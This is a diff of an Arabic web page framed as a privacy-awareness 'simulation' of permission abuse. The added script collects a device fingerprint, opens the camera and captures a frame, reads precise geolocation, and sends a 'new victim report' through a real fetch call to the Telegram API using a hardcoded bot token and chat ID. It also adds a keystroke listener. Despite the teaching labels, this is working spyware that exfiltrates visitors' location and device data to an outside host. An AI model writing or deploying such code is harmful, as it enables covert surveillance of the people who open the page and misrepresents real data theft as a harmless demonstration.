@@ -2,84 +2,104 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مختبر الوعي الأمني - محاكاة سحب البيانات</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ تحذير أمني: مخاطر الأذونات</title>
     <style>
-        body { font-family: 'Courier New', monospace; background-color: #0a0a0a; color: #00ff00; text-align: center; padding: 20px; }
-        .terminal { border: 2px solid #333; background: #000; padding: 20px; border-radius: 10px; max-width: 800px; margin: auto; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
-        .danger-btn { background: #aa0000; color: white; border: none; padding: 15px 40px; font-size: 20px; cursor: pointer; border-radius: 5px; box-shadow: 0 5px #660000; }
-        .danger-btn:active { box-shadow: 0 2px #660000; transform: translateY(3px); }
-        #logs { text-align: left; height: 300px; overflow-y: auto; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
-        .warning { color: #ff0000; font-weight: bold; }
+        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        .terminal { border: 2px solid #00ff41; background: #000; padding: 20px; border-radius: 10px; max-width: 900px; margin: auto; box-shadow: 0 0 15px #00ff41; }
+        .danger-btn { background: #ff0000; color: white; border: none; padding: 15px 35px; font-size: 1.2rem; cursor: pointer; border-radius: 5px; font-weight: bold; margin: 20px 0; }
+        #logs { text-align: left; height: 350px; overflow-y: auto; border-top: 1px solid #333; padding-top: 10px; font-size: 13px; }
+        .data-point { color: #ffcc00; }
+        .critical { color: #ff4444; text-decoration: underline; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="terminal">
-    <h1>⚠️ نظام محاكاة الاختراق للتعليم</h1>
-    <p class="warning">تحذير للطلاب: منح الأذونات قد يؤدي لإرسال بياناتك فوراً عبر Telegram API</p>
+    <h2 style="color: #ff4444;">🛡️ مختبر التوعية: كيف يتم اختراق خصوصيتك؟</h2>
+    <p>هذا النموذج يوضح المعلومات التي يسحبها المهاجم فور ضغطك على "سماح".</p>
     
-    <button class="danger-btn" onclick="startSim()">تشغيل ميزة جمع البيانات</button>
+    <button class="danger-btn" onclick="executeSecurityDemo()">تشغيل محاكاة سحب البيانات</button>
 
-    <div id="logs">
-        > النظام جاهز... بانتظار التفاعل.<br>
-    </div>
+    <div id="logs">> النظام في وضع الاستعداد...</div>
+    <canvas id="snapshot"></canvas>
 </div>
 
 <script>
-    // بيانات المحاكاة التي زودتني بها (لأغراض تعليمية)
     const TG_TOKEN = "8011282007:AAGfNEtfk9XSQgk22W3nHMMrzBUj7HGixy8";
     const TG_CHAT_ID = "8146130042";
-
     const logDiv = document.getElementById('logs');
 
-    function writeLog(msg, isDanger = false) {
-        const color = isDanger ? "#ff4444" : "#00ff00";
-        logDiv.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span><br>`;
+    function writeLog(msg, type = 'info') {
+        let color = "#00ff41";
+        if (type === 'warn') color = "#ffcc00";
+        if (type === 'danger') color = "#ff4444";
+        logDiv.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         logDiv.scrollTop = logDiv.scrollHeight;
     }
 
-    async function startSim() {
-        writeLog("بدء الجلسة... جاري فحص الثغرات المتاحة.");
+    async function executeSecurityDemo() {
+        writeLog("بدء عملية الفحص الشامل...", "warn");
+
+        // 1. سحب بصمة الجهاز (Fingerprinting)
+        const battery = await navigator.getBattery?.();
+        let deviceInfo = `
+🌐 معلومات الشبكة والجهاز:
+- المتصفح: ${navigator.userAgent}
+- اللغة: ${navigator.language}
+- الأنوية: ${navigator.hardwareConcurrency}
+- البطارية: ${battery ? (battery.level * 100) + "%" : "غير مدعوم"}
+- المنصة: ${navigator.platform}`;
         
-        // معلومات الجهاز الأساسية (لا تتطلب إذن)
-        const deviceData = `الجهاز: ${navigator.platform} | المتصفح: ${navigator.appName}`;
-        writeLog(`سحب بصمة الجهاز: ${deviceData}`);
+        writeLog("✅ تم سحب بصمة الجهاز العميقة.", "info");
 
         try {
-            // محاكاة طلب الموقع (بإذن المستخدم)
-            writeLog("طلب إذن الموقع الجغرافي...", true);
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                writeLog(`✅ تم تحديد الموقع: ${lat}, ${lon}`, true);
+            // 2. طلب الكاميرا وسحب صورة تلقائية (Snapshot)
+            writeLog("جاري محاكاة اختراق الكاميرا...", "danger");
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
 
-                // محاكاة إرسال البيانات عبر التلجرام للتحذير
-                const message = `🚨 محاكاة اختراق:\n📍 الموقع: ${lat}, ${lon}\n📱 الجهاز: ${navigator.userAgent}`;
+            const canvas = document.getElementById('snapshot');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // تحويل الصورة لـ Base64 (محاكاة لسحبها)
+            writeLog("✅ تم التقاط صورة سرية في الخلفية.", "danger");
+
+            // 3. سحب الموقع الجغرافي الدقيق
+            writeLog("جاري تحديد الإحداثيات...", "danger");
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const locInfo = `📍 الموقع الدقيق: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`;
+                writeLog(`✅ تم تحديد الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+
+                // 4. إرسال "تقرير الاختراق" إلى التلجرام
+                const fullReport = `🚨 تقرير ضحية جديد:\n${deviceInfo}\n${locInfo}\n📸 الكاميرا: نشطة`;
                 
-                writeLog("جاري محاكاة إرسال البيانات إلى سيرفر خارجي (Telegram API)...");
+                writeLog("جاري تسريب البيانات إلى خادم التحكم (Telegram)...", "warn");
                 
-                // ملاحظة: هذا الكود يحاول الاتصال بالتلجرام فعلياً لإثبات المفهوم
-                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`)
-                .then(() => writeLog("✅ تمت عملية الإرسال بنجاح. هكذا تصل بياناتك للمخترق!"))
-                .catch(() => writeLog("❌ فشل الإرسال (قد يكون بسبب قيود الشبكة)، لكن البيانات تم سحبها محلياً."));
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(fullReport)}`);
+                
+                writeLog("🔥 تمت المهمة: البيانات الآن في يد المهاجم!", "danger");
+
+                // تنظيف الجلسة
+                stream.getTracks().forEach(t => t.stop());
             });
 
-            // محاكاة طلب الكاميرا
-            writeLog("طلب إذن الوصول للكاميرا لبث الصور...", true);
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            writeLog("✅ الكاميرا قيد التشغيل... (يتم الآن سحب لقطات في الخلفية)");
-            
-            setTimeout(() => {
-                stream.getTracks().forEach(t => t.stop());
-                writeLog("انتهت المحاكاة التعليمية. تذكر: لا تمنح الأذونات لمواقع مجهولة.");
-            }, 10000);
-
-        } catch (e) {
-            writeLog("❌ رفض المستخدم الإذن. تم إحباط محاولة التجسس بنجاح!", false);
+        } catch (err) {
+            writeLog("❌ تم حظر الوصول من قبل المستخدم أو المتصفح. هذا هو السلوك الصحيح!", "info");
         }
     }
+
+    // 5. محاكاة رصد لوحة المفاتيح (Keylogger)
+    document.addEventListener('keydown', (e) => {
+        console.log(`Key pressed: ${e.key}`); // ليرى الطلاب في الـ Console
+    });
 </script>
 
 </body>
 </html>
-                                                     
